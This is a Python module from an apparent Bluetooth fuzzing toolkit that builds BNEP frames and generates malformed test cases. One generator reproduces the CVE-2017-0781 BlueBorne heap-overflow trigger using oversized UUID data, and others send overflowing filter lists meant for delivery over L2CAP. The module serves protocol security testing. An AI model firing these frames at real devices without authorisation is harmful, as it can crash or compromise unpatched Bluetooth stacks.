"""BNEP (Bluetooth Network Encapsulation Protocol) packet builder and fuzz case generator.

Constructs well-formed and malformed BNEP frames for protocol-aware fuzzing.
BNEP runs on L2CAP PSM 0x000F (15). All multi-byte fields are big-endian.

BNEP frame format:
  Type (1 byte, bits 0-6 = packet type, bit 7 = extension flag)
  [Extension headers if bit 7 set]
  Payload (variable)

Control frames (type 0x01) carry a control type + control data.

This module provides:
  - BNEP packet type and control type constants
  - Frame builders for all BNEP packet types
  - Control message builders (setup, filter, etc.)
  - Fuzz case generators targeting CVE-2017-0781 (BlueBorne heap overflow)

Reference: Bluetooth Core Spec v5.4, Vol 3, Part F (BNEP)
CVE targets: CVE-2017-0781 (Android BlueBorne heap underallocation)
"""

from __future__ import annotations

import struct

from blue_tap.modules.fuzzing._random import random_bytes


# ---------------------------------------------------------------------------
# BNEP Packet Types (bits 0-6 of the type byte)
# ---------------------------------------------------------------------------

BNEP_GENERAL_ETHERNET = 0x00
BNEP_CONTROL = 0x01
BNEP_COMPRESSED = 0x02
BNEP_COMPRESSED_SRC_ONLY = 0x03
BNEP_COMPRESSED_DST_ONLY = 0x04

# Human-readable names for logging/reporting
PACKET_TYPE_NAMES: dict[int, str] = {
    BNEP_GENERAL_ETHERNET: "GeneralEthernet",
    BNEP_CONTROL: "Control",
    BNEP_COMPRESSED: "Compressed",
    BNEP_COMPRESSED_SRC_ONLY: "CompressedSrcOnly",
    BNEP_COMPRESSED_DST_ONLY: "CompressedDstOnly",
}

# Extension flag — bit 7 of the type byte
BNEP_EXTENSION_FLAG = 0x80


# ---------------------------------------------------------------------------
# BNEP Control Types (first byte of control frame payload)
# ---------------------------------------------------------------------------

BNEP_CONTROL_COMMAND_NOT_UNDERSTOOD = 0x00
BNEP_SETUP_CONNECTION_REQ = 0x01
BNEP_SETUP_CONNECTION_RSP = 0x02
BNEP_FILTER_NET_TYPE_SET = 0x03
BNEP_FILTER_NET_TYPE_RSP = 0x04
BNEP_FILTER_MULTI_ADDR_SET = 0x05
BNEP_FILTER_MULTI_ADDR_RSP = 0x06

CONTROL_TYPE_NAMES: dict[int, str] = {
    BNEP_CONTROL_COMMAND_NOT_UNDERSTOOD: "CommandNotUnderstood",
    BNEP_SETUP_CONNECTION_REQ: "SetupConnectionRequest",
    BNEP_SETUP_CONNECTION_RSP: "SetupConnectionResponse",
    BNEP_FILTER_NET_TYPE_SET: "FilterNetTypeSet",
    BNEP_FILTER_NET_TYPE_RSP: "FilterNetTypeResponse",
    BNEP_FILTER_MULTI_ADDR_SET: "FilterMultiAddrSet",
    BNEP_FILTER_MULTI_ADDR_RSP: "FilterMultiAddrResponse",
}

# Valid control types for boundary checks
_VALID_CONTROL_TYPES = frozenset(range(0x00, 0x07))


# ---------------------------------------------------------------------------
# Standard BNEP Service UUIDs (UUID16)
# ---------------------------------------------------------------------------

UUID_PANU = 0x1115
UUID_NAP = 0x1116
UUID_GN = 0x1117


# ===========================================================================
# Frame Builders
# ===========================================================================

def build_general_ethernet(
    dst_mac: bytes,
    src_mac: bytes,
    ether_type: int,
    payload: bytes = b"",
) -> bytes:
    """Build a BNEP General Ethernet frame (type 0x00).

    Format:
      Type (1) + Destination MAC (6) + Source MAC (6) + EtherType (2 BE) + Payload

    Args:
        dst_mac: 6-byte destination MAC address.
        src_mac: 6-byte source MAC address.
        ether_type: 16-bit EtherType (e.g., 0x0800 for IPv4).
        payload: Ethernet payload data.

    Returns:
        Complete BNEP General Ethernet frame bytes.
    """
    return (
        bytes([BNEP_GENERAL_ETHERNET])
        + dst_mac
        + src_mac
        + struct.pack(">H", ether_type)
        + payload
    )


def build_control_frame(control_type: int, data: bytes = b"") -> bytes:
    """Build a BNEP Control frame (type 0x01).

    Format:
      Type (1) + Control Type (1) + Control Data (variable)

    Args:
        control_type: BNEP control type byte (0x00-0x06 for valid types).
        data: Raw control-type-specific data.

    Returns:
        Complete BNEP Control frame bytes.
    """
    return bytes([BNEP_CONTROL, control_type]) + data


def build_setup_connection_req(
    uuid_size: int = 2,
    dst_uuid: bytes | None = None,
    src_uuid: bytes | None = None,
) -> bytes:
    """Build a BNEP Setup Connection Request control message.

    Format:
      BNEP_CONTROL (1) + SETUP_REQ (1) + UUID Size (1) + Dst UUID + Src UUID

    The UUID Size field indicates the size of each UUID in bytes (2, 4, or 16
    for valid values). The total UUID data is 2 * uuid_size bytes.

    Args:
        uuid_size: Size of each UUID in bytes. Valid values: 2 (UUID16),
                   4 (UUID32), 16 (UUID128). Other values are invalid per spec.
        dst_uuid: Destination service UUID bytes. If None, defaults to
                  NAP (0x1116) for uuid_size=2, or zero-padded equivalent.
        src_uuid: Source service UUID bytes. If None, defaults to
                  PANU (0x1115) for uuid_size=2, or zero-padded equivalent.

    Returns:
        Complete BNEP Setup Connection Request frame bytes.
    """
    if dst_uuid is None:
        dst_uuid = struct.pack(">H", UUID_NAP).ljust(uuid_size, b"\x00")[:uuid_size]
    if src_uuid is None:
        src_uuid = struct.pack(">H", UUID_PANU).ljust(uuid_size, b"\x00")[:uuid_size]

    return bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_REQ, uuid_size]) + dst_uuid + src_uuid


def build_setup_connection_rsp(response_code: int) -> bytes:
    """Build a BNEP Setup Connection Response control message.

    Format:
      BNEP_CONTROL (1) + SETUP_RSP (1) + Response Code (2 BE)

    Args:
        response_code: 16-bit response code.
            0x0000 = Success, 0x0001 = Not Allowed,
            0x0002 = Invalid Dest UUID, 0x0003 = Invalid Src UUID,
            0x0004 = Invalid UUID Size, 0x0005 = Not Allowed (duplicate).

    Returns:
        Complete BNEP Setup Connection Response frame bytes.
    """
    return (
        bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_RSP])
        + struct.pack(">H", response_code)
    )


def build_filter_net_type_set(ranges: list[tuple[int, int]]) -> bytes:
    """Build a BNEP Filter Net Type Set control message.

    Format:
      BNEP_CONTROL (1) + FILTER_NET_TYPE_SET (1) + List Length (2 BE)
      + N * (Start EtherType (2 BE) + End EtherType (2 BE))

    Args:
        ranges: List of (start_etype, end_etype) tuples. Each EtherType
                is a 16-bit value defining the inclusive range.

    Returns:
        Complete BNEP Filter Net Type Set frame bytes.
    """
    range_data = b""
    for start, end in ranges:
        range_data += struct.pack(">HH", start, end)

    return (
        bytes([BNEP_CONTROL, BNEP_FILTER_NET_TYPE_SET])
        + struct.pack(">H", len(range_data))
        + range_data
    )


def build_filter_multicast_set(ranges: list[tuple[bytes, bytes]]) -> bytes:
    """Build a BNEP Filter Multi Addr Set control message.

    Format:
      BNEP_CONTROL (1) + FILTER_MULTI_ADDR_SET (1) + List Length (2 BE)
      + N * (Start Addr (6) + End Addr (6))

    Args:
        ranges: List of (start_addr, end_addr) tuples. Each address
                is a 6-byte MAC address defining the inclusive range.

    Returns:
        Complete BNEP Filter Multi Addr Set frame bytes.
    """
    range_data = b""
    for start_addr, end_addr in ranges:
        range_data += start_addr[:6].ljust(6, b"\x00") + end_addr[:6].ljust(6, b"\x00")

    return (
        bytes([BNEP_CONTROL, BNEP_FILTER_MULTI_ADDR_SET])
        + struct.pack(">H", len(range_data))
        + range_data
    )


def build_compressed(ether_type: int, payload: bytes = b"") -> bytes:
    """Build a BNEP Compressed Ethernet frame (type 0x02).

    Format:
      Type (1) + EtherType (2 BE) + Payload

    Both source and destination MAC addresses are omitted (compressed).

    Args:
        ether_type: 16-bit EtherType.
        payload: Ethernet payload data.

    Returns:
        Complete BNEP Compressed frame bytes.
    """
    return bytes([BNEP_COMPRESSED]) + struct.pack(">H", ether_type) + payload


def build_compressed_src_only(
    src_mac: bytes,
    ether_type: int,
    payload: bytes = b"",
) -> bytes:
    """Build a BNEP Compressed Ethernet Source Only frame (type 0x03).

    Format:
      Type (1) + Source MAC (6) + EtherType (2 BE) + Payload

    Destination MAC is omitted (implied from connection).

    Args:
        src_mac: 6-byte source MAC address.
        ether_type: 16-bit EtherType.
        payload: Ethernet payload data.

    Returns:
        Complete BNEP Compressed Source Only frame bytes.
    """
    return (
        bytes([BNEP_COMPRESSED_SRC_ONLY])
        + src_mac
        + struct.pack(">H", ether_type)
        + payload
    )


def build_compressed_dst_only(
    dst_mac: bytes,
    ether_type: int,
    payload: bytes = b"",
) -> bytes:
    """Build a BNEP Compressed Ethernet Destination Only frame (type 0x04).

    Format:
      Type (1) + Destination MAC (6) + EtherType (2 BE) + Payload

    Source MAC is omitted (implied from connection).

    Args:
        dst_mac: 6-byte destination MAC address.
        ether_type: 16-bit EtherType.
        payload: Ethernet payload data.

    Returns:
        Complete BNEP Compressed Destination Only frame bytes.
    """
    return (
        bytes([BNEP_COMPRESSED_DST_ONLY])
        + dst_mac
        + struct.pack(">H", ether_type)
        + payload
    )


# ===========================================================================
# Fuzz Generators
# ===========================================================================

def fuzz_setup_uuid_sizes() -> list[bytes]:
    """Generate Setup Connection Requests with various UUID size values.

    Tests how the BNEP parser handles:
      - uuid_size=0: Zero-length UUIDs
      - uuid_size=1: Non-standard size (not 2/4/16)
      - uuid_size=2: Valid UUID16
      - uuid_size=3: Non-standard odd size
      - uuid_size=4: Valid UUID32
      - uuid_size=8: Non-standard size
      - uuid_size=16: Valid UUID128
      - uuid_size=32: Oversized
      - uuid_size=128: Very oversized
      - uuid_size=255: Maximum single-byte value

    For each size, generates both matching-length UUID data and mismatched
    data (correct size field but only 2 bytes of UUID data).

    Returns:
        List of raw BNEP frame bytes.
    """
    cases: list[bytes] = []

    for size in (0, 1, 2, 3, 4, 8, 16, 32, 128, 255):
        # Matching UUID data: uuid_size * 2 bytes (dst + src)
        if size > 0:
            uuid_data = random_bytes(size * 2)
        else:
            uuid_data = b""
        cases.append(
            bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_REQ, size]) + uuid_data
        )

        # Mismatched: size field says one thing, but only 2 bytes of UUID data
        if size != 2:
            cases.append(
                bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_REQ, size])
                + b"\x11\x15\x11\x16"  # Only 4 bytes regardless of claimed size
            )

    return cases


def fuzz_setup_oversized_uuid() -> list[bytes]:
    """Generate CVE-2017-0781 pattern: UUID size causes heap underallocation.

    The attack sends a Setup Connection Request with uuid_size=16 (UUID128)
    but provides extra data beyond the expected 32 bytes (2 * 16). If the
    receiver allocates based on uuid_size but copies based on actual L2CAP
    payload length, this causes a heap overflow.

    Returns:
        List of raw BNEP frame bytes reproducing the BlueBorne pattern.
    """
    cases: list[bytes] = []

    # Classic BlueBorne: uuid_size=16 with 32 bytes of UUIDs + extra overflow data
    for extra_size in (1, 16, 64, 128, 256, 512, 1024):
        cases.append(
            bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_REQ, 0x10])  # uuid_size=16
            + b"\xFF" * 32  # Expected: two 16-byte UUIDs
            + b"\x41" * extra_size  # Overflow data
        )

    # uuid_size=2 but with massive trailing data
    cases.append(
        bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_REQ, 0x02])
        + b"\x11\x15\x11\x16"  # Two UUID16s (4 bytes)
        + b"\x42" * 1024  # Overflow
    )

    # uuid_size=4 with massive trailing data
    cases.append(
        bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_REQ, 0x04])
        + b"\x00\x00\x11\x15\x00\x00\x11\x16"  # Two UUID32s (8 bytes)
        + b"\x43" * 1024  # Overflow
    )

    return cases


def fuzz_oversized_ethernet() -> list[bytes]:
    """Generate General Ethernet frames with oversized payloads.

    Tests buffer handling for payloads exceeding standard Ethernet MTU (1500)
    and various power-of-two boundaries.

    Returns:
        List of raw BNEP frame bytes with large payloads.
    """
    cases: list[bytes] = []
    broadcast_mac = b"\xFF" * 6

    for size in (1500, 2000, 4096, 65535):
        # Use deterministic padding instead of random to aid reproducibility
        # Cap actual data at 4096 to avoid excessive memory usage
        payload = b"\x41" * min(size, 4096)
        cases.append(
            build_general_ethernet(broadcast_mac, broadcast_mac, 0x0800, payload)
        )

    return cases


def fuzz_invalid_control_types() -> list[bytes]:
    """Generate BNEP Control frames with undefined control type bytes.

    Valid control types are 0x00-0x06. This generates frames for all
    undefined values 0x07-0xFF to test error handling.

    Returns:
        List of raw BNEP Control frames with invalid control types.
    """
    cases: list[bytes] = []
    for ct in range(0x07, 0x100):
        cases.append(bytes([BNEP_CONTROL, ct]))
    return cases


def fuzz_filter_overflow() -> list[bytes]:
    """Generate Filter Net Type Set and Filter Multi Addr Set with excessive ranges.

    Creates filter lists that exceed typical L2CAP MTU (672 bytes default,
    often negotiated to 1024). Tests whether the receiver validates the
    list length against available buffer space.

    Returns:
        List of raw BNEP frames with oversized filter lists.
    """
    cases: list[bytes] = []

    # Filter Net Type Set: each range is 4 bytes (2 * uint16)
    # 256 ranges = 1024 bytes, exceeding default L2CAP MTU
    for count in (64, 128, 256, 512):
        ranges = [(0x0800, 0x0800 + i) for i in range(count)]
        cases.append(build_filter_net_type_set(ranges))

    # Filter Multi Addr Set: each range is 12 bytes (2 * 6-byte MAC)
    # 64 ranges = 768 bytes, 128 ranges = 1536 bytes
    for count in (32, 64, 128):
        ranges = [
            (bytes([0x01, 0x00, 0x5E, 0x00, 0x00, i & 0xFF]),
             bytes([0x01, 0x00, 0x5E, 0x00, 0x00, (i + 1) & 0xFF]))
            for i in range(count)
        ]
        cases.append(build_filter_multicast_set(ranges))

    # Empty filter list (list length = 0)
    cases.append(build_filter_net_type_set([]))
    cases.append(build_filter_multicast_set([]))

    # Filter with length field claiming more data than present
    # Manually construct: control header + length=0xFFFF + minimal data
    cases.append(
        bytes([BNEP_CONTROL, BNEP_FILTER_NET_TYPE_SET])
        + struct.pack(">H", 0xFFFF)
        + b"\x08\x00\x08\x00"  # Only one range (4 bytes)
    )
    cases.append(
        bytes([BNEP_CONTROL, BNEP_FILTER_MULTI_ADDR_SET])
        + struct.pack(">H", 0xFFFF)
        + b"\xFF" * 12  # Only one range (12 bytes)
    )

    return cases


def fuzz_zero_length_frames() -> list[bytes]:
    """Generate empty (zero-payload) frames for each BNEP packet type.

    Tests minimum-length parsing for each frame type. Most parsers expect
    at least a certain number of header bytes after the type byte.

    Returns:
        List of raw BNEP frames with only the type byte and no payload.
    """
    cases: list[bytes] = []

    # Each type byte alone — no additional header or payload data
    for pkt_type in (
        BNEP_GENERAL_ETHERNET,
        BNEP_CONTROL,
        BNEP_COMPRESSED,
        BNEP_COMPRESSED_SRC_ONLY,
        BNEP_COMPRESSED_DST_ONLY,
    ):
        cases.append(bytes([pkt_type]))

    # Control frame with control type but no control data
    for ctrl_type in range(0x00, 0x07):
        cases.append(bytes([BNEP_CONTROL, ctrl_type]))

    return cases


def fuzz_extension_bit() -> list[bytes]:
    """Generate frames with the extension bit (bit 7) set in the type byte.

    When bit 7 is set, the receiver should parse extension headers before
    the payload. Tests both with and without actual extension header data.

    Extension header format:
      Type (1, bit 7 = more extensions) + Length (1) + Data (Length bytes)

    Returns:
        List of raw BNEP frames with extension bit set.
    """
    cases: list[bytes] = []

    for pkt_type in (
        BNEP_GENERAL_ETHERNET,
        BNEP_CONTROL,
        BNEP_COMPRESSED,
        BNEP_COMPRESSED_SRC_ONLY,
        BNEP_COMPRESSED_DST_ONLY,
    ):
        type_with_ext = pkt_type | BNEP_EXTENSION_FLAG

        # Extension bit set but no extension header data
        cases.append(bytes([type_with_ext]))

        # Extension bit set with a minimal extension header (type=0, length=0)
        cases.append(bytes([type_with_ext, 0x00, 0x00]))

        # Extension bit set with extension header containing data
        cases.append(bytes([type_with_ext, 0x00, 0x04]) + b"\xDE\xAD\xBE\xEF")

        # Chained extensions: first has bit 7 set (more), second does not
        ext1 = bytes([0x80, 0x02]) + b"\xAA\xBB"  # Extension with more-bit set
        ext2 = bytes([0x00, 0x02]) + b"\xCC\xDD"  # Final extension
        cases.append(bytes([type_with_ext]) + ext1 + ext2)

        # Extension with length=255 but no data (truncated)
        cases.append(bytes([type_with_ext, 0x00, 0xFF]))

    # -----------------------------------------------------------------------
    # Cases with proper frame headers before extension data.
    # The raw cases above (extension bit set without headers) are kept as-is
    # to test header parsing robustness. These additional cases test extension
    # parsing when the parser has successfully consumed the frame header.
    # -----------------------------------------------------------------------

    dummy_mac = b"\x11\x22\x33\x44\x55\x66"
    ether_ipv4 = struct.pack(">H", 0x0800)

    # -- Type 0x80: General Ethernet + extension bit --
    # Proper 14-byte header (DstMAC + SrcMAC + EtherType) + valid extension
    gen_hdr = dummy_mac + dummy_mac + ether_ipv4  # 14 bytes
    # Valid extension header (type=0, length=4, 4 data bytes)
    cases.append(bytes([0x80]) + gen_hdr + bytes([0x00, 0x04]) + b"\xDE\xAD\xBE\xEF")

    # Proper header + truncated extension (length=0x20 but no data)
    cases.append(bytes([0x80]) + gen_hdr + bytes([0x00, 0x20]))

    # Proper header + chained extensions (first has more-bit, second is final)
    ext_chain = bytes([0x80, 0x02]) + b"\xAA\xBB" + bytes([0x00, 0x02]) + b"\xCC\xDD"
    cases.append(bytes([0x80]) + gen_hdr + ext_chain)

    # -- Type 0x82: Compressed Ethernet + extension bit --
    # Compressed has no MACs, only EtherType(2) before extension
    cases.append(bytes([0x82]) + ether_ipv4 + bytes([0x00, 0x04]) + b"\xDE\xAD\xBE\xEF")

    # -- Type 0x83: Compressed Source Only + extension bit --
    # SrcMAC(6) + EtherType(2) before extension
    src_hdr = dummy_mac + ether_ipv4  # 8 bytes
    cases.append(bytes([0x83]) + src_hdr + bytes([0x00, 0x04]) + b"\xDE\xAD\xBE\xEF")

    return cases


def fuzz_invalid_packet_types() -> list[bytes]:
    """Generate frames with undefined packet types (0x05-0x7F).

    Valid BNEP packet types are 0x00-0x04. Types 0x05-0x7F are reserved.
    Tests how the receiver handles unknown packet type values.

    Returns:
        List of raw BNEP frames with invalid type bytes.
    """
    cases: list[bytes] = []
    for pkt_type in range(0x05, 0x80):
        # Type byte alone
        cases.append(bytes([pkt_type]))
        # Type byte with some dummy payload
        cases.append(bytes([pkt_type]) + b"\x00" * 16)
    return cases


# ===========================================================================
# Master Generator
# ===========================================================================

def generate_all_bnep_fuzz_cases() -> list[bytes]:
    """Generate a combined list of all BNEP fuzz payloads.

    Collects outputs from all fuzz generators into a single flat list.
    Each entry is a raw byte sequence suitable for sending over L2CAP PSM 15.

    Returns:
        List of fuzz case bytes. Typical count: ~700-900 cases depending
        on configuration.
    """
    cases: list[bytes] = []

    # UUID size manipulation
    cases.extend(fuzz_setup_uuid_sizes())

    # CVE-2017-0781 BlueBorne heap overflow pattern
    cases.extend(fuzz_setup_oversized_uuid())

    # Oversized Ethernet payloads
    cases.extend(fuzz_oversized_ethernet())

    # Invalid control types (0x07-0xFF)
    cases.extend(fuzz_invalid_control_types())

    # Filter list overflow attacks
    cases.extend(fuzz_filter_overflow())

    # Zero-length frames for each type
    cases.extend(fuzz_zero_length_frames())

    # Extension bit manipulation
    cases.extend(fuzz_extension_bit())

    # Invalid packet types (0x05-0x7F)
    cases.extend(fuzz_invalid_packet_types())

    return cases
